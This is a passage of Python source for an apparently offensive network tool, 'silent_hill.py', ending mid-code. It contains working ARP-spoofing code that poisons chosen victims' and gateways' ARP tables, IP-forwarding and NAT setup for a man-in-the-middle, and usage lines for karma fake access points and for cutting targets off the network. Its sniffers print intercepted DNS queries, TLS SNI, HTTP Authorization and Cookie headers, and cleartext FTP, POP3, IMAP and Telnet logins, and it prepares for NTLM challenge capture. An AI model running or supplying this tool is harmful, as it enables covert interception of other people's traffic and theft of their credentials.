import requests, sys, argparse, ipaddress, subprocess, threading, time, os, socket, re, logging, signal, json, shutil, netifaces, random, itertools, ipaddress
import concurrent.futures
from scapy.all import *
from scapy.packet import Packet
from scapy.layers.smb2 import SMB2_Header, SMB2_Tree_Connect_Request, SMB2_Query_Directory_Request, SMB2_Query_Directory_Response, FILE_ID_BOTH_DIR_INFORMATION, FILE_BOTH_DIR_INFORMATION, FILE_FULL_DIR_INFORMATION, SMB2_Create_Request, SMB2_Create_Response
from scapy.layers.ntlm import NTLMSSP, NTLMv2_RESPONSE
from scapy.all import ARP, Ether, srp, ICMP, IP, IPv6, sr1, conf, TCP, UDP, DNSQR, sniff, DNS, Dot11ProbeReq, get_if_addr, rdpcap, Raw #, FTP, SMTP, Telnet, POP, IMAP, IPv6
from tqdm import tqdm
from collections import defaultdict
from colorama import Fore, Style, init


########################## Banner & co ##########################
R = Fore.RED
C = Fore.CYAN
B = Fore.BLUE
G = Fore.GREEN
Y = Fore.YELLOW
MA = Fore.MAGENTA
RESET = Style.RESET_ALL

banner = rf'''{R}
 ░▒▓███████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░▒▓████████▓▒░    
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           
 ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░         
       ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    
       ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    
░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    

            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░ {Y}
                                            <raphaelthief> {RESET}
'''

Debug_display = f'''
{G}[+] Some examples of use{RESET}
    sudo python silent_hill.py -c -n 192.168.1.0/24
    sudo python silent_hill.py -d -n 192.168.1.0/24
    sudo python silent_hill.py -l -i wlan0
    sudo python silent_hill.py -s -i wlan0 -r 192.168.1.1 -t 192.168.1.93
    sudo python silent_hill.py -s -i wlan0 -r 192.168.1.24 -r 192.168.1.55 -r 192.168.1.87 -t 192.168.1.93
    sudo python silent_hill.py -k -r 192.168.1.1 -i wlan0 -t 192.168.1.46
    sudo python silent_hill.py -k -r 192.168.1.254 -i wlan0 -t 192.168.1.46 -t 192.168.1.24
    sudo python silent_hill.py --karma-scan --karma-interface wlan0
    sudo python silent_hill.py --karma free_wifi --karma-interface wlan0 --karma-interface-internet wlan1 --karma-listen
    sudo python silent_hill.py --kill-karma

{G}[+] Show iptables rules{RESET}
    sudo iptables -L -v -n

{G}[+] Restore interface name{RESET}
    sudo ip link set wlan0mon name wlan0

{G}[+] Up & Down interface{RESET}
    sudo airmon-ng start wlan0
    sudo airmon-ng stop wlan0mon
    sudo services NetworkManager restart
    sudo reboot

{G}[+] Other{RESET}
    Just open the source code and RTFM
'''



########################## VARIABLES ##########################
# Pass error messages
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
requests.packages.urllib3.disable_warnings()

conf.verb = 0
IPINFO_TOKEN = None  # ipinfo.io token API if you want
MY_IP = "127.0.0.1"
summary = ""
PACKET_FILTER = set()
EXCLUDE_SMB_FOLDERS = False

WEB_PORTS = [80, 443, 8080, 8443]

OTHER_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    67: "DHCP Server",
    68: "DHCP Client",
    110: "POP3",
    111: "RPCbind",
    135: "RPC (Windows)",
    137: "NetBIOS Name Service",
    138: "NetBIOS Datagram",
    139: "NetBIOS Session",
    143: "IMAP",
    161: "SNMP",
    389: "LDAP",

    123: "NTP",

    445: "SMB",
    587: "SMTP Submission",

    636: "LDAPS",
    2049: "NFS",

    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",

    5900: "VNC",

    5985: "WinRM HTTP",
    5986: "WinRM HTTPS",

    631: "CUPS (Printing)",
    1433: "Microsoft SQL Server"
}

SSH_PORT = 22
_ssh_seen_connections = set()
_ssh_seen_banners = set()

SMB2_CREATE_PENDING = {}
NTLM_CHALLENGES = {}  # (src, dst, sport, dport) -> server_challenge (8 bytes hex)

PORTS = WEB_PORTS + list(OTHER_PORTS.keys())
seen_ips = set()
ip_info_cache = {}
found_hosts = []
seen_hosts = {}

victim_ips = set()
gateway_ips = set()


iface_spy = ""

gateway_macs = {}
victim_macs = {}

start_iface = ""

karma_interface = "" # Karma interface (monitor mode)
INTERNET_INTERFACE = "" # Internet access point (connected to network)
ESSID_fakeAP = "" # ESSID fake AP for karma attack
HOSTAPD_CONF = "/etc/hostapd/hostapd.conf"
DNSMASQ_CONF = "/etc/dnsmasq.conf"
SYSCTL_CONF = "/etc/sysctl.conf"
BACKUP_SUFFIX = ".backup_openap"
DNSMASQ_LEASES = "/var/lib/misc/dnsmasq.leases"

highlight_keywords_list = []

DWELL_TIME = 0.3
BROADCAST_BATCH_SIZE = 4
CHANNEL_LIST = [1, 6, 11]

seen_clients = set()
active_ssids = []
display_lock = threading.Lock()
probe_responses_seen = set()
seen_smb_shares = set()

# Less noisi but more detectable
FIXED_MACS = [
    "00:11:22:33:44:01",
    "C0:FF:EE:33:44:02",
    "DC:A6:32:33:44:03",
    "DE:AD:BE:33:44:04"
]

stop_event = threading.Event()

def signal_handler(sig, frame): # Ctrl+C cleint discovery & scanning stuff
    print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
    restore_arp()
    sys.exit(0)

def signal_handler2(sig, frame):
    print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
    restore_arp()
    for v_ip in victim_ips:
        os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {v_ip} -j DROP")
        os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {v_ip} -j DROP")
    print(f"[*] Ebtables rules removed{RESET}")
    sys.exit(0)

def signal_handler3(sig, frame):  # Ctrl+C handler
    print(f"\n[*] {R}Ctrl + C detected. Stopping threads...{RESET}")
    stop_event.set()  # Kill all threads
    restore_interface(start_iface, "karma_off")
    sys.exit(0)

def load_oui(file_path): # Manufacturer (from MAC adress) file oui.txt
    oui_map = {}
    download_oui("oui.txt")
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if "(hex)" in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        prefix = parts[0].replace("-", "")
                        vendor = " ".join(parts[2:])
                        oui_map[prefix] = vendor.strip()
    except FileNotFoundError:
        print(f"[!] {R}OUI file not found:", file_path, RESET)
    return oui_map

def download_oui(file_path="oui.txt"):
    if not os.path.exists(file_path):
        print("[*] Downloading OUI database...")
        url = "https://standards-oui.ieee.org/oui/oui.txt"
        try:
            r = requests.get(url)
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(r.text)
            print("[+] OUI file downloaded successfully.")
        except Exception as e:
            print(f"[!] {R}Failed to download OUI file: {e}{RESET}")

oui_map = load_oui("oui.txt")

def current_time():
    return "[" + time.strftime("%H:%M:%S") + "]"

def highlight_keywords(text):
    if not highlight_keywords_list:
        return text

    for word in highlight_keywords_list:
        if word in text.lower():
            # Remplace insensible à la casse
            pattern = re.compile(re.escape(word), re.IGNORECASE)
            text = pattern.sub(f"{R}\\g<0>{Y}", text)
    return text

########################## SPY MODE (--spy) ##########################
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=6, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc

    print(f"[!] MAC not found for {ip}. Enter manually (format XX:XX:XX:XX:XX:XX) or 'skip':")
    while True:
        mac = input(f"    {ip} > ").strip().lower()
        if mac == "skip":
            return None
        if re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", mac):
            return mac
        print("[!] Invalid MAC format. Try again or 'skip'.")


# Setup passive MITM config
def enable_ip_forwarding():
    print("[*] Enabling IP forwarding and setting up clean NAT ...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -D POSTROUTING -o {} -j MASQUERADE 2>/dev/null".format(iface_spy))
    os.system("iptables -t nat -A POSTROUTING -o {} -j MASQUERADE".format(iface_spy))


def spoof():
    global victim_macs, gateway_ips, gateway_macs
    for ip in sorted(victim_ips):
        mac = get_mac(ip)
        if mac:
            victim_macs[ip] = mac
            print(f"[+] Target {ip} -> {mac}")
        else:
            print(f"[-] MAC not found for target {ip}")

    if not victim_macs:
        print(f"[-] {R}No target MAC addresses found. Exiting{RESET}")
        exit(1)

    for gw_ip in gateway_ips:
        gw_mac = get_mac(gw_ip)
        if gw_mac:
            gateway_macs[gw_ip] = gw_mac
            print(f"[+] Gateway {gw_ip} -> {gw_mac}")
        else:
            print(f"[-] MAC not found for {gw_ip}, skipping")

    if not victim_macs or not gateway_macs:
        print(f"[-] {R}MAC not found. Exiting{RESET}")
        exit(1)

    print("[*] Starting ARP spoofing...")
    try:
        while True:
            for v_ip, v_mac in victim_macs.items():
                for gw_ip, gw_mac in gateway_macs.items():
                    pkt_to_victim = Ether(dst=v_mac) / ARP(op=2, pdst=v_ip, psrc=gw_ip, hwdst=v_mac)
                    sendp(pkt_to_victim, iface=iface_spy, verbose=0)
                    pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=v_ip, hwdst=gw_mac)
                    sendp(pkt_to_gateway, iface=iface_spy, verbose=0)

            time.sleep(0.3)
    except KeyboardInterrupt:
        pass


# Restore ARP tables
def restore_arp():
    print("[!] Restoring ARP tables...")
    if not victim_macs or not gateway_macs:
        return

    for v_ip, v_mac in victim_macs.items():
        for gw_ip, gw_mac in gateway_macs.items():
            sendp(Ether(dst=v_mac) / ARP(op=2, pdst=v_ip, psrc=gw_ip, hwsrc=gw_mac), count=5, iface=iface_spy, verbose=0)
            sendp(Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=v_ip, hwsrc=v_mac), count=5, iface=iface_spy, verbose=0)


def get_ip_info(ip):
    if ip in ip_info_cache:
        return ip_info_cache[ip]

    # 1. Reverse DNS
    # Try this method not rate limited
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        if hostname and hostname != ip:
            ip_info_cache[ip] = hostname
            return hostname + f" {RESET}(local reverse DNS)"
    except socket.herror:
        pass  # No reverse DNS found, try ipinfo

    # 2. Fallback to ipinfo.io
    # Can be rate limited (you can add API key --> IPINFO_TOKEN)
    try:
        url = f"https://ipinfo.io/{ip}"
        if IPINFO_TOKEN:
            url += f"?token={IPINFO_TOKEN}"
        output = subprocess.check_output(["curl", "-s", url], timeout=5).decode()
        data = json.loads(output)
        hostname = data.get("hostname", "").strip()
        org = data.get("org", "").strip()

        result = hostname if hostname and hostname != ip else org # Get hostname or org datas from the IP
        ip_info_cache[ip] = result if result else None
        return result
    except Exception:
        ip_info_cache[ip] = None
        return None

def process_DNS__packet(packet): # [DNS] packets
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        queried = packet[DNSQR].qname.decode(errors="ignore")
        highlighted = highlight_keywords(queried)
        print(f"{current_time()} - {Y}[DNS]{RESET} {packet[IP].src} → {packet[IP].dst} : {Y}{highlighted}{RESET}")


def process_ssdp_packet(packet):
    """
    SSDP / UPnP on UDP
      - M-SEARCH
      - NOTIFY
      - HTTP/1.1 of SSDP
    """

    if not (packet.haslayer(UDP) and packet.haslayer(Raw)):
        return

    try:
        raw = bytes(packet[Raw].load)
        if not raw:
            return

        data = raw.decode("utf-8", errors="replace")
        lines = data.split("\r\n")
        if not lines:
            return

        start_line = lines[0].strip()

        # ----------------------------------------------------
        # SSDP
        # ----------------------------------------------------
        is_ssdp = (start_line.startswith("M-SEARCH ") or start_line.startswith("NOTIFY ") or start_line.startswith("HTTP/1.1 "))
        if not is_ssdp:
            return

        # ----------------------------------------------------
        # Headers
        # ----------------------------------------------------
        headers = {}
        for line in lines[1:]:
            if not line:
                break

            if ":" not in line:
                continue

            name, value = line.split(":", 1)
            headers[
                name.strip().lower()
            ] = value.strip()

        # ----------------------------------------------------
        # IP / ports
        # ----------------------------------------------------
        src = (packet[IP].src if packet.haslayer(IP) else "?")
        dst = (packet[IP].dst if packet.haslayer(IP) else "?")
        src_port = packet[UDP].sport
        dst_port = packet[UDP].dport

        # ----------------------------------------------------
        # SSDP type
        # ----------------------------------------------------
        if start_line.startswith("M-SEARCH "):
            ssdp_type = "M-SEARCH"
        elif start_line.startswith("NOTIFY "):
            ssdp_type = "NOTIFY"
        elif start_line.startswith("HTTP/1.1 "):
            ssdp_type = "RESPONSE"
        else:
            ssdp_type = "SSDP"

        print(f"{current_time()} - {C}[SSDP]{RESET} {src}:{src_port} → {dst}:{dst_port}")
        print(f"              {C}↪️{RESET} Type: {Y}{ssdp_type}{RESET}")
        print(f"              {C}↪️{RESET} {Y}{start_line}{RESET}")

        # ----------------------------------------------------
        # Interesting SSDP headers
        # ----------------------------------------------------
        interesting_headers = [
            ("host", "HOST"),
            ("man", "MAN"),
            ("mx", "MX"),
            ("st", "ST"),
            ("nt", "NT"),
            ("nts", "NTS"),
            ("usn", "USN"),
            ("location", "LOCATION"),
            ("server", "SERVER"),
            ("cache-control", "CACHE-CONTROL"),
            ("bootid.upnp.org", "BOOTID.UPNP.ORG"),
            ("configid.upnp.org", "CONFIGID.UPNP.ORG"),
            ("searchport.upnp.org", "SEARCHPORT.UPNP.ORG"),
            ("al", "AL"),
        ]

        for key, display_name in interesting_headers:
            if key not in headers:
                continue

            value = headers[key]
            print(f"              {C}↪️{RESET} {display_name}: {Y}{value}{RESET}")

        print()

    except Exception as e:
        print(f"{current_time()} - {R}[SSDP-ERROR]{RESET} {type(e).__name__}: {e}")


def process_http_packet(packet):
    if not (packet.haslayer(TCP) and packet.haslayer(Raw)):
        return

    try:
        raw = bytes(packet[Raw].load)
        if not raw:
            return

        # ----------------------------------------------------
        # Decode
        # ----------------------------------------------------
        http_data = raw.decode("utf-8", errors="replace")
        lines = http_data.split("\r\n")
        if not lines:
            return

        request_line = lines[0].strip()

        # ----------------------------------------------------
        # Known HTTP/UPnP methods
        # ----------------------------------------------------
        methods = (
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "PATCH",
            "HEAD",
            "OPTIONS",
            "CONNECT",
            "TRACE",

            # UPnP Eventing
            "NOTIFY",
            "SUBSCRIBE",
            "UNSUBSCRIBE",
        )

        # ----------------------------------------------------
        # Detect HTTP request / response
        # ----------------------------------------------------
        parts = request_line.split()

        if not parts:
            return

        http_type = None
        method = ""
        uri = ""
        version = ""
        status_code = ""
        reason = ""

        # ----------------------------------------------------
        # HTTP RESPONSE
        # HTTP/1.0 200 OK
        # HTTP/1.1 200 OK
        # ----------------------------------------------------
        if (len(parts) >= 2 and parts[0].upper().startswith("HTTP/")):
            version = parts[0]
            try:
                status_code = parts[1]
                if not status_code.isdigit():
                    return

            except IndexError:
                return

            reason = " ".join(parts[2:])
            http_type = "response"

        # ----------------------------------------------------
        # HTTP REQUEST
        # GET / HTTP/1.1
        # POST / HTTP/1.1
        # NOTIFY /upnp/... HTTP/1.1
        # ----------------------------------------------------
        elif (len(parts) >= 3 and parts[2].upper().startswith("HTTP/")):
            method = parts[0].upper()
            uri = parts[1]
            version = parts[2]

            if method not in methods:
                return

            http_type = "request"

        else:
            return

        # ----------------------------------------------------
        # Check HTTP type
        # ----------------------------------------------------
        if http_type == "request":
            if method not in methods:
                return

            if not version.upper().startswith("HTTP/"):
                return

        elif http_type == "response":
            if not version.upper().startswith("HTTP/"):
                return

            try:
                status_int = int(status_code)
            except ValueError:
                return

        # ----------------------------------------------------
        # Parse headers
        # ----------------------------------------------------
        headers = {}
        for line in lines[1:]:
            if not line:
                break

            if ":" not in line:
                continue

            name, value = line.split(":", 1)
            headers[
                name.strip().lower()
            ] = value.strip()

        # ----------------------------------------------------
        # IP
        # ----------------------------------------------------
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
        elif packet.haslayer(IPv6):
            src = packet[IPv6].src
            dst = packet[IPv6].dst
        else:
            src = "?"
            dst = "?"
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport

        # ----------------------------------------------------
        # Display request
        # ----------------------------------------------------
        if http_type == "request":
            print(f"{current_time()} - {C}[HTTP REQUEST]{RESET} {src}:{src_port} → {dst}:{dst_port}")
            print(f"              {C}↪️{RESET} Method: {Y}{method}{RESET}")
            print(f"              {C}↪️{RESET} URI: {Y}{uri}{RESET}")
            print(f"              {C}↪️{RESET} Version: {Y}{version}{RESET}")

        # ----------------------------------------------------
        # Display response
        # ----------------------------------------------------
        elif http_type == "response":
            print(f"{current_time()} - {C}[HTTP RESPONSE]{RESET} {src}:{src_port} → {dst}:{dst_port}")
            print(f"              {C}↪️{RESET} Version: {Y}{version}{RESET}")
            print(f"              {C}↪️{RESET} Status: {Y}{status_code}{RESET} {reason}")

            # ------------------------------------------------
            # HTTP redirect
            # 301 / 302 / 303 / 307 / 308
            # ------------------------------------------------
            try:
                status_int = int(status_code)
            except ValueError:
                status_int = 0

            if status_int in (301, 302, 303, 307, 308):
                print(f"              {C}↪️{RESET} Redirection: {Y}HTTP {status_int}{RESET}")
                location = headers.get("location")
                if location:
                    print(f"              {C}↪️{RESET} Location: {Y}{location}{RESET}")

        # ----------------------------------------------------
        # UPnP detect
        # ----------------------------------------------------
        is_upnp = (method in ("NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE") or "upnp" in uri.lower() or headers.get("content-type", "").lower().startswith("text/xml") or "upnp:event" in headers.get("nt", "").lower() or "upnp:event" in headers.get( "callback", "").lower())
        if is_upnp:
            print(f"              {C}↪️{RESET} Protocol: {Y}UPnP / Eventing{RESET}")

        # ----------------------------------------------------
        # Interesting headers 
        # ----------------------------------------------------
        interesting_headers = [

            # ------------------------------------------------
            # Destination / routage
            # ------------------------------------------------
            ("host", "Host"),
            ("origin", "Origin"),
            ("referer", "Referer"),

            # ------------------------------------------------
            # Client
            # ------------------------------------------------
            ("user-agent", "User-Agent"),

            # ------------------------------------------------
            # Content
            # ------------------------------------------------
            ("content-type", "Content-Type"),
            ("content-length", "Content-Length"),
            ("content-encoding", "Content-Encoding"),
            ("transfer-encoding", "Transfer-Encoding"),

            # ------------------------------------------------
            # Acceptation
            # ------------------------------------------------
            ("accept", "Accept"),
            ("accept-language", "Accept-Language"),
            ("accept-encoding", "Accept-Encoding"),

            # ------------------------------------------------
            # Connection
            # ------------------------------------------------
            ("connection", "Connection"),
            ("keep-alive", "Keep-Alive"),

            # ------------------------------------------------
            # Cache
            # ------------------------------------------------
            ("cache-control", "Cache-Control"),
            ("pragma", "Pragma"),
            ("if-none-match", "If-None-Match"),
            ("if-modified-since", "If-Modified-Since"),

            # ------------------------------------------------
            # Proxy
            # ------------------------------------------------
            ("via", "Via"),
            ("forwarded", "Forwarded"),
            ("x-forwarded-for", "X-Forwarded-For"),
            ("x-forwarded-host", "X-Forwarded-Host"),
            ("x-forwarded-proto", "X-Forwarded-Proto"),
            ("x-real-ip", "X-Real-IP"),

            # ------------------------------------------------
            # CORS
            # ------------------------------------------------
            (
                "access-control-request-method",
                "Access-Control-Request-Method"
            ),

            (
                "access-control-request-headers",
                "Access-Control-Request-Headers"
            ),

            # ------------------------------------------------
            # Client hints
            # ------------------------------------------------
            ("sec-ch-ua", "Sec-CH-UA"),
            ("sec-ch-ua-mobile", "Sec-CH-UA-Mobile"),
            ("sec-ch-ua-platform", "Sec-CH-UA-Platform"),

            # ------------------------------------------------
            # Fetch metadata
            # ------------------------------------------------
            ("sec-fetch-site", "Sec-Fetch-Site"),
            ("sec-fetch-mode", "Sec-Fetch-Mode"),
            ("sec-fetch-dest", "Sec-Fetch-Dest"),
            ("sec-fetch-user", "Sec-Fetch-User"),

            # ------------------------------------------------
            # Authentification
            # ------------------------------------------------
            ("authorization", "Authorization"),
            ("proxy-authorization", "Proxy-Authorization"),

            # ------------------------------------------------
            # Cookies
            # ------------------------------------------------
            ("cookie", "Cookie"),

            # ------------------------------------------------
            # Client identification
            # ------------------------------------------------
            ("dnt", "DNT"),
            (
                "upgrade-insecure-requests",
                "Upgrade-Insecure-Requests"
            ),

            # ------------------------------------------------
            # WebSocket / Upgrade
            # ------------------------------------------------
            ("upgrade", "Upgrade"),
            ("sec-websocket-key", "Sec-WebSocket-Key"),
            ("sec-websocket-version", "Sec-WebSocket-Version"),
            ("sec-websocket-protocol", "Sec-WebSocket-Protocol"),

            # ------------------------------------------------
            # UPnP
            # ------------------------------------------------
            ("nt", "NT"),
            ("nts", "NTS"),
            ("usn", "USN"),
            ("sid", "SID"),
            ("seq", "SEQ"),
            ("callback", "CALLBACK"),
            ("timeout", "TIMEOUT"),
            ("soapaction", "SOAPAction"),

            # ------------------------------------------------
            # HTTP / redirections
            # ------------------------------------------------
            ("location", "Location"),
            ("content-location", "Content-Location"),
            ("refresh", "Refresh"),
            ("etag", "ETag"),
            ("last-modified", "Last-Modified"),
            ("expires", "Expires"),
            ("server", "Server"),
            ("allow", "Allow"),
            ("www-authenticate", "WWW-Authenticate"),
            ("proxy-authenticate", "Proxy-Authenticate"),
            ("vary", "Vary"),
            ("age", "Age"),
        ]

        # ----------------------------------------------------
        # Display headers
        # ----------------------------------------------------
        for key, display_name in interesting_headers:
            if key not in headers:
                continue

            value = headers[key]
            print(f"              {C}↪️{RESET} {display_name}: {Y}{value}{RESET}")

        # ----------------------------------------------------
        # Other info's
        # ----------------------------------------------------
        content_length = headers.get("content-length")
        content_type = headers.get("content-type")
        if content_length:
            try:
                content_length_int = int(content_length)
                print(f"              {C}↪️{RESET} Body length: {Y}{content_length_int} bytes{RESET}")
            except ValueError:
                pass

        if content_type:
            print(f"              {C}↪️{RESET} Body type: {Y}{content_type}{RESET}")

        # ----------------------------------------------------
        # Body
        # ----------------------------------------------------
        if "\r\n\r\n" in http_data:

            _, body = http_data.split("\r\n\r\n", 1)

            if body.strip():
                MAX_BODY_DISPLAY = 4096
                display_body = body[
                    :MAX_BODY_DISPLAY
                ]

                if len(body) > MAX_BODY_DISPLAY:
                    display_body += (f"\n... [truncated, total={len(body)} bytes]")

                print(f"{current_time()} - {C}[HTTP]{RESET} Body:")
                print(f"{Y}{display_body}{RESET}")
        print()
    except Exception as e:
        print(f"{current_time()} - {R}[HTTP-ERROR]{RESET} {type(e).__name__}: {e}")
 

def extract_sni(packet): # [TLS] packets
    try:
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 443:
            data = bytes(packet[Raw].load)
            if data[0] == 0x16 and data[5] == 0x01:
                session_id_len = data[43]
                idx = 44 + session_id_len
                cipher_suites_len = int.from_bytes(data[idx:idx+2], byteorder="big")
                idx += 2 + cipher_suites_len
                compression_methods_len = data[idx]
                idx += 1 + compression_methods_len
                extensions_len = int.from_bytes(data[idx:idx+2], byteorder="big")
                idx += 2
                end = idx + extensions_len

                while idx + 4 <= end:
                    ext_type = int.from_bytes(data[idx:idx+2], "big")
                    ext_len = int.from_bytes(data[idx+2:idx+4], "big")
                    idx += 4
                    if ext_type == 0:  # SNI
                        sni_len = int.from_bytes(data[idx+3:idx+5], "big")
                        sni = data[idx+5:idx+5+sni_len].decode("utf-8", errors="ignore")
                        
                        highlighted = highlight_keywords(sni)
                        print(f"{current_time()} - {R}[TLS]{RESET} {packet[IP].src} SNI: {Y}{highlighted}{RESET}")
                        return True  # SNI found
                    idx += ext_len
    except Exception:
        pass
    return False

def is_local_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
        return addr.is_private
    except ValueError:
        return False

def handle_external_ip(ip): # [IP] packets --> External IP adresses : try to get DNS name
    if is_local_ip(ip):
        return  # local IP

    if ip not in seen_ips:
        seen_ips.add(ip)
        info = get_ip_info(ip)
        if info:
            highlighted = highlight_keywords(info.strip())
            print(f"{current_time()} - {G}[IP]{RESET} External IP detected: {ip} --> {Y}{highlighted}{RESET}") # Info found
        else:
            print(f"{current_time()} - {G}[IP]{RESET} External IP detected: {ip}") # Info not found, just display the external IP


TRACKED_CLEARTEXT_FLOWS = {}
FTP_COMMAND = re.compile(
    rb"^(USER|PASS|ACCT|CWD|CDUP|PWD|LIST|NLST|MLSD|MLST|"
    rb"RETR|STOR|STOU|APPE|DELE|MKD|RMD|RNFR|RNTO|TYPE|"
    rb"PASV|EPSV|PORT|EPRT|AUTH|FEAT|SYST|QUIT|NOOP|SIZE|"
    rb"MDTM|REST|ABOR|OPTS|HELP|STAT|SITE)(?:[ \t\r\n]|$)",
    re.I
)

FTP_RESPONSE = re.compile(rb"^[1-5][0-9]{2}[ -]")

SMTP_COMMAND = re.compile(
    rb"^(EHLO|HELO|MAIL FROM:|RCPT TO:|DATA|RSET|NOOP|"
    rb"QUIT|VRFY|EXPN|STARTTLS|AUTH)(?:[ \t\r\n]|$)",
    re.I
)

SMTP_RESPONSE = re.compile(rb"^[2-5][0-9]{2}[ -]")

POP3_SIGNATURE = re.compile(
    rb"^(USER|PASS|STAT|LIST|RETR|DELE|NOOP|RSET|TOP|UIDL|"
    rb"APOP|CAPA|STLS|QUIT)(?:[ \t\r\n]|$)",
    re.I
)

POP3_RESPONSE = re.compile(rb"^(?:\+OK|-ERR)(?:[ \t\r\n]|$)", re.I)

IMAP_SIGNATURE = re.compile(
    rb"^(?:\* |[A-Za-z0-9]+ )(?:OK|NO|BAD|BYE|CAPABILITY|"
    rb"LOGIN|AUTHENTICATE|SELECT|EXAMINE|FETCH|STORE|SEARCH|"
    rb"LIST|LSUB|STATUS|LOGOUT|STARTTLS|NAMESPACE)(?:[ \t\r\n]|$)",
    re.I
)

HTTP_SIGNATURE = re.compile(
    rb"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT|TRACE)"
    rb" [^\r\n]{1,4096} HTTP/1\.[01]\r?\n",
    re.I
)

HTTP_RESPONSE = re.compile(rb"^HTTP/1\.[01] [1-5][0-9]{2}(?: |$)")

IRC_SIGNATURE = re.compile(
    rb"^(NICK|USER|JOIN|PART|PRIVMSG|NOTICE|PING|PONG|"
    rb"PASS|QUIT|CAP|AUTHENTICATE|MODE|TOPIC)(?:[ \t]|$)",
    re.I
)

SIP_SIGNATURE = re.compile(
    rb"^(INVITE|REGISTER|OPTIONS|BYE|CANCEL|ACK|MESSAGE|"
    rb"SUBSCRIBE|NOTIFY|REFER|INFO|UPDATE) sip:",
    re.I
)

SIP_RESPONSE = re.compile(rb"^SIP/2\.0 [1-6][0-9]{2}(?: |$)")

TELNET_COMMAND = re.compile(
    rb"^(login:|username:|password:|[\w.-]+ login:)",
    re.I
)

def detect_cleartext_protocol(payload):
    if not payload:
        return None

    data = payload.lstrip(b"\r\n\x00 \t").encode("utf-8", errors="replace") if isinstance(payload, str) else payload.lstrip(b"\r\n\x00 \t")
    signatures = (
        ("HTTP", HTTP_SIGNATURE),
        ("HTTP", HTTP_RESPONSE),
        ("FTP", FTP_COMMAND),
        ("FTP", FTP_RESPONSE),
        ("SMTP", SMTP_COMMAND),
        ("SMTP", SMTP_RESPONSE),
        ("POP3", POP3_SIGNATURE),
        ("POP3", POP3_RESPONSE),
        ("IMAP", IMAP_SIGNATURE),
        ("IRC", IRC_SIGNATURE),
        ("SIP", SIP_SIGNATURE),
        ("SIP", SIP_RESPONSE),
        ("Telnet", TELNET_COMMAND)
    )

    for protocol, regex in signatures:
        if regex.search(data):
            return protocol
    return None


def process_cleartext_protocols(packet):
    try:
        if "ICMP" not in PACKET_FILTER:
            if packet.haslayer(ICMP):
                icmp_type = packet[ICMP].type
                icmp_code = packet[ICMP].code
                print(f"{current_time()} - {MA}[ICMP]{RESET} {packet[IP].src} → {Y}{packet[IP].dst}{RESET} | Type: {Y}{icmp_type}{RESET} Code: {Y}{icmp_code}{RESET}")
                return
        
        if packet.haslayer(TCP) and "TCP" not in PACKET_FILTER:
            tcp = packet[TCP]
            sport, dport = tcp.sport, tcp.dport
            if sport in (443, 8443, 9443) or dport in (443, 8443, 9443):
                return

            raw = packet.getlayer(Raw)
            payload = bytes(raw.load) if raw else b""
            clean_payload = payload.decode("utf-8", errors="replace").rstrip()
            src_ip = packet[IP].src if IP in packet else packet[IPv6].src
            dst_ip = packet[IP].dst if IP in packet else packet[IPv6].dst
            endpoints = sorted([
                (src_ip, sport),
                (dst_ip, dport),
            ])

            flow_key = tuple(endpoints)
            tcp_protocols = {
                20: "FTP-data",
                21: "FTP",
                23: "Telnet",
                25: "SMTP",
                79: "Finger",
